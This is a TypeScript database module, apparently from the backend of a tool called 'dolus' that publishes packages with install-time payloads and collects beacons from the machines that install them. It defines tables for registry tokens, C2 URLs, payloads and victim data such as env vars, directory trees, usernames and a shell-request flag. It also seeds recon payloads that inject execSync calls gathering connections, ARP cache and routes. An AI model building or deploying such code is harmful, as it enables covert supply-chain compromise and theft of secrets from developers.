import { DatabaseSync } from 'node:sqlite';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';
import { hashPassword } from './auth';

const dbPath = process.env.DATABASE_PATH || path.join(process.cwd(), 'dolus.db');

// singleton for Next.js dev hot-reload
const g = globalThis as unknown as { _dolusDb?: DatabaseSync };
const db = g._dolusDb ?? new DatabaseSync(dbPath);
g._dolusDb = db;

db.exec('PRAGMA journal_mode = WAL');

export const SCHEMA = `
CREATE TABLE IF NOT EXISTS payloads (
  id          INTEGER PRIMARY KEY AUTOINCREMENT,
  name        TEXT NOT NULL UNIQUE,
  description TEXT,
  install_js  TEXT NOT NULL,
  builtin     INTEGER NOT NULL DEFAULT 0,
  created_at  INTEGER NOT NULL DEFAULT (unixepoch())
);

CREATE TABLE IF NOT EXISTS accounts (
  id           INTEGER PRIMARY KEY AUTOINCREMENT,
  name         TEXT NOT NULL UNIQUE,
  registry_url TEXT NOT NULL,
  token        TEXT NOT NULL,
  c2_url       TEXT NOT NULL,
  notes        TEXT,
  created_at   INTEGER NOT NULL DEFAULT (unixepoch())
);

CREATE TABLE IF NOT EXISTS packages (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  name       TEXT NOT NULL UNIQUE,
  status     TEXT NOT NULL DEFAULT 'pending',
  account_id INTEGER REFERENCES accounts(id),
  payload_id INTEGER REFERENCES payloads(id),
  created_at INTEGER NOT NULL DEFAULT (unixepoch())
);

CREATE TABLE IF NOT EXISTS beacons (
  id           INTEGER PRIMARY KEY AUTOINCREMENT,
  beacon_id    TEXT NOT NULL UNIQUE,
  pkg_name     TEXT NOT NULL,
  hostname     TEXT,
  username     TEXT,
  platform     TEXT,
  arch         TEXT,
  os_release   TEXT,
  interfaces   TEXT,
  dir_tree     TEXT,
  env_vars     TEXT,
  cwd          TEXT,
  last_seen    INTEGER NOT NULL DEFAULT (unixepoch()),
  created_at   INTEGER NOT NULL DEFAULT (unixepoch()),
  kill         INTEGER NOT NULL DEFAULT 0,
  destroyed_at INTEGER
);

CREATE TABLE IF NOT EXISTS heartbeats (
  id        INTEGER PRIMARY KEY AUTOINCREMENT,
  beacon_id INTEGER NOT NULL REFERENCES beacons(id),
  ts        INTEGER NOT NULL DEFAULT (unixepoch())
);

CREATE TABLE IF NOT EXISTS settings (
  key   TEXT PRIMARY KEY,
  value TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS pow_challenges (
  nonce      TEXT PRIMARY KEY,
  created_at INTEGER NOT NULL DEFAULT (unixepoch())
);
`;

db.exec(SCHEMA);
// ponytail: idempotent column additions for existing DBs (ALTER TABLE throws if column exists)
try { db.exec('ALTER TABLE beacons ADD COLUMN kill INTEGER NOT NULL DEFAULT 0'); } catch (_) {}
try { db.exec('ALTER TABLE beacons ADD COLUMN destroyed_at INTEGER'); } catch (_) {}
try { db.exec('ALTER TABLE beacons ADD COLUMN shell_requested INTEGER NOT NULL DEFAULT 0'); } catch (_) {}
try { db.exec('ALTER TABLE packages ADD COLUMN account_id INTEGER REFERENCES accounts(id)'); } catch (_) {}
try { db.exec('ALTER TABLE packages ADD COLUMN payload_id INTEGER REFERENCES payloads(id)'); } catch (_) {}

// Seed default settings (INSERT OR IGNORE — first boot only)
const seedSetting = db.prepare('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)');
seedSetting.run('password_hash', hashPassword('dolus'));
seedSetting.run('beacon_secret', crypto.randomUUID());
seedSetting.run('pow_enabled', '0');
seedSetting.run('pow_difficulty', '5');
seedSetting.run('shell_idle_timeout', '180');

// Seed built-in payloads — always update install_js so new template changes take effect
const TEMPLATE_DIR = path.join(process.cwd(), '..', 'packages', 'template');
try {
  const basicJs = fs.readFileSync(path.join(TEMPLATE_DIR, 'install.js'), 'utf8');
  const extendedJs = basicJs.replace(
    'const body = JSON.stringify(payload);',
    `// extended: active connections, ARP cache, routes
function run(cmd) {
  try { return cp.execSync(cmd, { timeout: 3000, stdio: ['ignore', 'pipe', 'ignore'] }).toString().trim(); } catch (_) { return ''; }
}
payload.connections = run('ss -tnp 2>/dev/null || netstat -tnp 2>/dev/null');
payload.arp_cache   = run('arp -n 2>/dev/null || ip neigh 2>/dev/null');
payload.routes      = run('ip route 2>/dev/null || route -n 2>/dev/null');

const body = JSON.stringify(payload);`
  );
  const seed = db.prepare('INSERT OR IGNORE INTO payloads (name, description, install_js, builtin) VALUES (?, ?, ?, 1)');
  const updateJs = db.prepare('UPDATE payloads SET install_js = ? WHERE name = ? AND builtin = 1');
  seed.run('recon-basic', 'Hostname, OS, env vars, dir tree, network interfaces', basicJs);
  updateJs.run(basicJs, 'recon-basic');
  seed.run('recon-extended', 'Basic + active TCP connections, ARP cache, routing table', extendedJs);
  updateJs.run(extendedJs, 'recon-extended');
} catch (_) { /* template dir not found, skip seeding */ }

export default db;

export type Payload = {
  id: number;
  name: string;
  description: string | null;
  install_js: string;
  builtin: number;
  created_at: number;
};

export type Package = {
  id: number;
  name: string;
  status: 'pending' | 'published' | 'failed';
  account_id: number | null;
  payload_id: number | null;
  created_at: number;
};

export type Account = {
  id: number;
  name: string;
  registry_url: string;
  token: string;
  c2_url: string;
  notes: string | null;
  created_at: number;
};

export type Beacon = {
  id: number;
  beacon_id: string;
  pkg_name: string;
  hostname: string | null;
  username: string | null;
  platform: string | null;
  arch: string | null;
  os_release: string | null;
  interfaces: string | null;
  dir_tree: string | null;
  env_vars: string | null;
  cwd: string | null;
  last_seen: number;
  created_at: number;
  kill: number;
  destroyed_at: number | null;
};
